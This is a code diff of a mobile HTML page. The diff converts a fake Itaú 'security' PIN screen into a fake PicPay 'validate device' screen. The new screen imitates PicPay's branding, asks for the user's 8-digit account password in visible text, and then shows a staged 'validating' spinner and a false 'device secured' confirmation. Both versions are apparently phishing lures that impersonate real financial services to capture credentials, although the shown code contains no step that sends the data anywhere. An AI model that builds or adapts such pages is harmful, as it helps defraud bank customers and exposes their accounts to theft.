@@ -3,164 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Itaú | Segurança</title>
+    <title>PicPay | Validar Dispositivo</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
         
         :root {
-            --itau-orange: #EC7000;
-            --itau-blue: #003399;
-            --itau-gray: #5E6E79;
+            --picpay-green: #21C25E;
+            --picpay-dark: #111111;
+            --picpay-gray: #F5F5F5;
         }
 
         body, html {
             height: 100%;
             margin: 0;
             background-color: white;
-            font-family: 'Roboto', sans-serif;
-            color: #333;
+            font-family: 'Inter', sans-serif;
+            color: var(--picpay-dark);
             overflow: hidden;
         }
 
-        .app-header {
-            height: 60px;
-            background-color: var(--itau-blue);
-            color: white;
-            display: flex;
-            align-items: center;
-            padding: 0 16px;
-            font-weight: 500;
+        .step-container {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            padding: 0 24px;
         }
 
-        .pin-container {
-            display: grid;
-            grid-template-columns: repeat(6, 1fr);
-            gap: 12px;
+        .step-active {
+            display: flex;
+        }
+
+        .custom-input {
             width: 100%;
-            max-width: 280px;
-            margin-top: 40px;
-        }
-
-        .pin-field {
-            aspect-ratio: 1 / 1;
-            border: 1px solid #CCC;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            border-bottom: 2px solid #E5E7EB;
+            padding: 16px 0;
             font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--itau-blue);
-            background: #F4F4F4;
+            font-weight: 600;
+            letter-spacing: 0.1em;
+            color: var(--picpay-dark);
+            background: transparent;
+            outline: none;
+            transition: border-color 0.3s;
         }
 
-        .pin-field.active {
-            border-color: var(--itau-orange);
-            background: white;
-            box-shadow: 0 0 0 2px rgba(236, 112, 0, 0.2);
+        .custom-input:focus {
+            border-color: var(--picpay-green);
         }
 
-        #real-input {
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .btn-itau {
-            background-color: var(--itau-orange);
+        .btn-picpay {
+            background-color: var(--picpay-green);
             color: white;
-            font-weight: 700;
+            font-weight: 600;
             padding: 16px;
-            border-radius: 4px;
+            border-radius: 50px;
             width: 100%;
-            transition: opacity 0.2s;
+            font-size: 1rem;
+            transition: all 0.2s;
         }
 
-        .btn-itau:disabled {
-            opacity: 0.5;
+        .btn-picpay:disabled {
+            background-color: #E5E7EB;
+            color: #9CA3AF;
+        }
+
+        .progress-indicator {
+            height: 4px;
+            background: #F3F4F6;
+            width: 100%;
+            position: fixed;
+            top: 60px;
+            left: 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--picpay-green);
+            width: 50%;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* Estilo para deixar a senha visível por padrão */
+        input[type="text"].password-style {
+            -webkit-text-security: none;
         }
     </style>
 </head>
-<body onclick="document.getElementById('real-input').focus()">
+<body>
 
-    <div class="flex flex-col h-screen">
-        <header class="app-header">
-            <i data-lucide="chevron-left" class="mr-4"></i>
-            <span class="text-lg">Itaú segurança</span>
-        </header>
+    <!-- Header -->
+    <header class="h-[60px] flex items-center px-4 justify-between fixed top-0 w-full bg-white z-20">
+        <button onclick="prevStep()" class="p-2">
+            <i data-lucide="arrow-left" class="w-6 h-6 text-gray-800"></i>
+        </button>
+        <div class="flex items-center gap-1">
+            <svg width="24" height="24" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="512" cy="512" r="512" fill="#21C25E"/>
+                <path d="M700 350H324V674H700V350Z" fill="white"/>
+            </svg>
+            <span class="font-bold text-xl tracking-tight">PicPay</span>
+        </div>
+        <div class="w-10"></div> <!-- Spacer -->
+    </header>
 
-        <main class="flex-1 px-8 pt-12 flex flex-col items-center">
-            <h1 class="text-2xl font-bold text-gray-800 text-center">Senha eletrônica</h1>
-            <p class="text-center text-gray-600 mt-4">
-                Digite sua senha de <span class="font-bold">6 dígitos</span>
+    <div class="progress-indicator">
+        <div id="progress-bar" class="progress-bar"></div>
+    </div>
+
+    <!-- ETAPA 1: SENHA DE 8 DÍGITOS -->
+    <div id="step1" class="step-container step-active pt-28">
+        <div class="flex flex-col">
+            <h1 class="text-2xl font-bold mb-2">Confirme sua senha</h1>
+            <p class="text-gray-500 text-sm mb-8 leading-relaxed">
+                Para sua segurança, digite sua senha de acesso de 8 dígitos para continuar.
             </p>
 
-            <div class="pin-container" id="pin-display">
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
+            <div class="relative mt-4">
+                <input type="text" 
+                       id="pass-8-digits" 
+                       class="custom-input password-style" 
+                       placeholder="00000000" 
+                       maxlength="8" 
+                       inputmode="numeric"
+                       autocomplete="off">
+                <p id="counter" class="text-xs font-medium text-gray-400 mt-3 text-right">0 / 8 dígitos</p>
             </div>
+        </div>
 
-            <input 
-                type="text" 
-                id="real-input" 
-                maxlength="6" 
-                inputmode="numeric" 
-                pattern="[0-9]*"
-                autocomplete="off"
-                autofocus
-            >
-        </main>
+        <div class="mt-auto pb-10">
+            <button onclick="nextStep()" id="btn-next" disabled class="btn-picpay">Continuar</button>
+        </div>
+    </div>
 
-        <footer class="p-8">
-            <button id="btn-confirm" disabled class="btn-itau">
-                Confirmar
-            </button>
-            <div class="text-center mt-6 text-sm text-[#003399] font-medium">
-                Esqueci minha senha
-            </div>
-        </footer>
+    <!-- ETAPA 2: CARREGANDO / PROCESSANDO -->
+    <div id="step2" class="step-container pt-28 items-center text-center">
+        <div class="w-16 h-16 border-4 border-gray-100 border-t-[#21C25E] rounded-full animate-spin mb-6"></div>
+        <h1 class="text-xl font-bold">Validando informações</h1>
+        <p class="text-gray-500 text-sm mt-2">Isso leva apenas alguns instantes...</p>
+    </div>
+
+    <!-- TELA DE SUCESSO -->
+    <div id="step-success" class="step-container pt-28 items-center text-center">
+        <div class="w-20 h-20 bg-[#21C25E] rounded-full flex items-center justify-center mb-6">
+            <i data-lucide="shield-check" class="text-white w-12 h-12"></i>
+        </div>
+        <h1 class="text-2xl font-bold">Dispositivo Seguro</h1>
+        <p class="text-gray-500 mt-4 px-4">
+            A proteção avançada foi aplicada com sucesso. Sua conta PicPay está protegida.
+        </p>
+        <div class="mt-10 w-full">
+            <button onclick="location.reload()" class="btn-picpay">Entendido</button>
+        </div>
     </div>
 
     <script>
+        // Inicializa ícones
         lucide.createIcons();
 
-        const realInput = document.getElementById('real-input');
-        const pinFields = document.querySelectorAll('.pin-field');
-        const btnConfirm = document.getElementById('btn-confirm');
+        let currentStep = 1;
+        const passInput = document.getElementById('pass-8-digits');
+        const btnNext = document.getElementById('btn-next');
+        const progressBar = document.getElementById('progress-bar');
+        const counter = document.getElementById('counter');
 
-        // Garante o foco inicial
-        window.onload = () => realInput.focus();
-
-        realInput.addEventListener('input', (e) => {
-            // Remove qualquer caractere que não seja número
-            const val = e.target.value.replace(/[^0-9]/g, '');
-            e.target.value = val;
+        // Lógica do Input de 8 dígitos
+        passInput.addEventListener('input', (e) => {
+            // Garante que apenas números sejam digitados
+            e.target.value = e.target.value.replace(/\D/g, '');
             
-            pinFields.forEach((field, i) => {
-                if (i < val.length) {
-                    field.textContent = val[i]; // Senha Visível
-                    field.classList.remove('active');
-                } else {
-                    field.textContent = '';
-                    if (i === val.length) {
-                        field.classList.add('active');
-                    } else {
-                        field.classList.remove('active');
-                    }
-                }
-            });
+            const len = e.target.value.length;
+            counter.innerText = `${len} / 8 dígitos`;
+            
+            // Habilita o botão apenas com 8 dígitos
+            btnNext.disabled = len !== 8;
 
-            btnConfirm.disabled = (val.length !== 6);
+            if(len === 8) {
+                counter.classList.add('text-green-500');
+            } else {
+                counter.classList.remove('text-green-500');
+            }
         });
 
-        // Impede que o usuário perca o foco do teclado
-        document.body.addEventListener('click', () => realInput.focus());
+        function nextStep() {
+            if (currentStep === 1) {
+                document.getElementById('step1').classList.remove('step-active');
+                document.getElementById('step2').classList.add('step-active');
+                progressBar.style.width = '100%';
+                currentStep = 2;
+
+                // Simulação de processamento
+                setTimeout(() => {
+                    document.getElementById('step2').classList.remove('step-active');
+                    document.getElementById('step-success').classList.add('step-active');
+                    document.querySelector('.progress-indicator').style.display = 'none';
+                }, 2500);
+            }
+        }
+
+        function prevStep() {
+            if (currentStep === 1) {
+                // Ação de voltar para o app original (simulação)
+                console.log("Voltando...");
+            } else if (currentStep === 2) {
+                document.getElementById('step2').classList.remove('step-active');
+                document.getElementById('step1').classList.add('step-active');
+                progressBar.style.width = '50%';
+                currentStep = 1;
+            }
+        }
+
+        // Foco automático ao abrir
+        window.onload = () => passInput.focus();
     </script>
 </body>
 </html>
